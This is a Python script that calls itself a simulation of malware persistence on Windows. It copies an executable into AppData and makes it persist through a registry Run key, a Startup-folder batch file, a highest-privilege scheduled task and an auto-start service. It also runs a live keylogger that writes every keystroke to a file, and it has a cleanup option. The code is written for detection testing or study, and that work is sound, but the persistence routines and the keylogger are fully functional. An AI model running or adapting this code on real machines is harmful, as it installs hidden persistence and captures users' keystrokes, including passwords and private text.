##before testing, pip install "pynput" - not pyinput

import os
import shutil
import sys
import winreg
import subprocess
import time
import ctypes
from pynput import keyboard

# Constants
APPDATA = os.getenv('APPDATA')
STARTUP_DIR = os.path.join(APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
FAKE_EXECUTABLE = os.path.join(APPDATA, "fake_malware.exe")
KEYLOG_FILE = os.path.join(APPDATA, "keylog.txt")
TASK_NAME = "FakeMalwareTask"
SERVICE_NAME = "FakeMalwareService"
SERVICE_DISPLAY_NAME = "Fake Malware Service"

# --- Technique 1: Copy executable to AppData ---
def copy_to_appdata():
    shutil.copyfile(sys.executable, FAKE_EXECUTABLE)

# --- Technique 2: Add to Registry Run Key ---
def add_to_registry():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "FakeMalware", 0, winreg.REG_SZ, FAKE_EXECUTABLE)
    winreg.CloseKey(key)

# --- Technique 3: Add to Startup Folder ---
def add_to_startup():
    batch_path = os.path.join(STARTUP_DIR, "start_fake.bat")
    with open(batch_path, "w") as f:
        f.write(f'start "" "{FAKE_EXECUTABLE}"')

# --- Technique 4: Schedule a Task ---
def add_scheduled_task():
    subprocess.call(["schtasks", "/Create", "/SC", "ONLOGON", "/TN", TASK_NAME, "/TR", FAKE_EXECUTABLE, "/RL", "HIGHEST"])

# --- Technique 5: Create a fake service ---
def create_fake_service():
    subprocess.call(["sc", "create", SERVICE_NAME, "binPath=", FAKE_EXECUTABLE, "DisplayName=", SERVICE_DISPLAY_NAME, "start=", "auto"])

# --- Optional: Keylogger ---
def keylogger():
    def on_press(key):
        with open(KEYLOG_FILE, "a") as f:
            f.write(f"{key}\n")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# --- Cleanup ---
def cleanup():
    try:
        os.remove(FAKE_EXECUTABLE)
    except: pass

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "FakeMalware")
        winreg.CloseKey(key)
    except: pass

    try:
        os.remove(os.path.join(STARTUP_DIR, "start_fake.bat"))
    except: pass

    subprocess.call(["schtasks", "/Delete", "/TN", TASK_NAME, "/F"])
    subprocess.call(["sc", "delete", SERVICE_NAME])

    try:
        os.remove(KEYLOG_FILE)
    except: pass

# --- Main Entry Point ---
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--clean":
        cleanup()
        print("[+] Cleaned up all persistence techniques.")
    else:
        copy_to_appdata()
        add_to_registry()
        add_to_startup()
        add_scheduled_task()
        create_fake_service()
        keylogger()
        print("[+] Persistence techniques simulated. Running keylogger...")
        while True:
            time.sleep(10)
